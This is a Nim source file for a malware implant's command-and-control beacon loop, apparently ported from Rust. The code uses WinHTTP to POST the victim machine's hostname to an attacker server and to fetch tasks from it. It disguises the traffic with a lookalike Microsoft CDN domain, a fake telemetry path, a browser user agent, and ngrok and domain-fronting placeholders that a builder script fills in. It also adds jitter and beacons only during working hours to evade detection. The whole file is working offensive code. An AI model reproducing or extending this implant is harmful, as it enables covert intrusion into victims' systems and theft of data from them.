# c2.nim — HTTP/S beacon loop using WinHTTP
#
# Bug fix: original Rust defined `pub unsafe fn run()` but main.rs called
# `c2::beacon_loop(&SLEEP_KEY)`. Fixed: renamed to beaconLoop(key: array[16, byte]).

import winim
import winim/winhttp

const
  SLEEP_MS*:      uint32 = 30_000'u32
  C2_HOST*:       string = "update.microsoft-cdn.net"
  C2_PORT*:       uint16 = 443'u16
  C2_BEACON_PATH*: string = "/telemetry/v2/collect"
  TIMEOUT*:       uint32 = 10_000'u32

# Operator-patched at build time by builder.py
const
  NGROK_HOST*:          string = "NGROK_HOST_PLACEHOLDER"
  FRONT_DOMAIN*:        string = "FRONT_DOMAIN_PLACEHOLDER"
  BEACON_INTERVAL_MS*:  uint64 = 15_000'u64
  JITTER_PCT*:          uint64 = 30'u64
  BEACON_HOUR_START*:   uint32 = 8'u32
  BEACON_HOUR_END*:     uint32 = 20'u32
  DEAD_SLEEP_SECS*:     uint64 = 3600'u64

const
  WINHTTP_ACCESS_TYPE_DEFAULT_PROXY = 0'u32
  WINHTTP_FLAG_SECURE               = 0x00800000'u32
  WINHTTP_NO_REFERER: ptr uint16    = nil
  WINHTTP_QUERY_STATUS_CODE         = 19'u32
  WINHTTP_QUERY_FLAG_NUMBER         = 0x20000000'u32
  WINHTTP_OPTION_CONNECT_TIMEOUT    = 3'u32

proc toWide(s: string): seq[uint16] =
  result = newSeq[uint16](s.len + 1)
  for i, c in s:
    result[i] = uint16(c)
  result[s.len] = 0

proc getHostname(): string =
  # unsafe
  var buf: array[256, WCHAR]
  var size: DWORD = 256
  discard GetComputerNameW(addr buf[0], addr size)
  var s = newString(int(size))
  for i in 0 ..< int(size):
    s[i] = char(buf[i])
  s

proc buildBeacon(): seq[byte] =
  let host = getHostname()
  let msg  = "{\"host\":\"" & host & "\",\"tid\":0}"
  result   = cast[seq[byte]](msg)

proc winhttpRequest(body: seq[byte]): seq[byte] =
  # unsafe — raw WinHTTP calls
  let ua      = toWide("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
  let hostW   = toWide(NGROK_HOST)
  let pathW   = toWide(C2_BEACON_PATH)
  let verbW   = toWide("POST")
  let httpVer = toWide("HTTP/1.1")

  let session = WinHttpOpen(
    cast[LPCWSTR](addr ua[0]),
    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
    nil, nil, 0)
  if session == nil: return @[]

  var timeout = TIMEOUT
  discard WinHttpSetOption(session, WINHTTP_OPTION_CONNECT_TIMEOUT,
                           addr timeout, 4)

  let conn = WinHttpConnect(session, cast[LPCWSTR](addr hostW[0]),
                            C2_PORT, 0)
  if conn == nil:
    discard WinHttpCloseHandle(session)
    return @[]

  let req = WinHttpOpenRequest(
    conn,
    cast[LPCWSTR](addr verbW[0]),
    cast[LPCWSTR](addr pathW[0]),
    cast[LPCWSTR](addr httpVer[0]),
    WINHTTP_NO_REFERER,
    nil,
    WINHTTP_FLAG_SECURE)
  if req == nil:
    discard WinHttpCloseHandle(conn)
    discard WinHttpCloseHandle(session)
    return @[]

  let ct    = toWide("Content-Type: application/json\r\n")
  let bptr  = if body.len > 0: cast[LPVOID](unsafeAddr body[0]) else: nil
  let ok    = WinHttpSendRequest(
    req,
    cast[LPCWSTR](addr ct[0]),
    uint32(ct.len),
    bptr,
    uint32(body.len),
    uint32(body.len),
    0)
  if ok == 0:
    discard WinHttpCloseHandle(req)
    discard WinHttpCloseHandle(conn)
    discard WinHttpCloseHandle(session)
    return @[]

  discard WinHttpReceiveResponse(req, nil)

  var status: uint32 = 0
  var statusSz: uint32 = 4
  discard WinHttpQueryHeaders(
    req,
    WINHTTP_QUERY_STATUS_CODE or WINHTTP_QUERY_FLAG_NUMBER,
    nil,
    addr status,
    addr statusSz,
    nil)

  var response: seq[byte]
  var buf: array[4096, byte]
  while true:
    var nRead: uint32 = 0
    let rd = WinHttpReadData(req, addr buf[0], uint32(buf.len), addr nRead)
    if rd == 0 or nRead == 0: break
    for i in 0 ..< int(nRead):
      response.add(buf[i])

  discard WinHttpCloseHandle(req)
  discard WinHttpCloseHandle(conn)
  discard WinHttpCloseHandle(session)
  response

proc dispatchTask(task: seq[byte]) =
  discard task  # task dispatch handled by beacon loop

# Primary beacon loop — never returns.
# Fix: renamed from `run()` (no params) to `beaconLoop(key)` to match call site in main.
proc beaconLoop*(key: array[16, byte]) {.noReturn.} =
  while true:
    let beacon = buildBeacon()
    if beacon.len > 0:
      let task = winhttpRequest(beacon)
      if task.len > 0:
        dispatchTask(task)
    Sleep(SLEEP_MS)
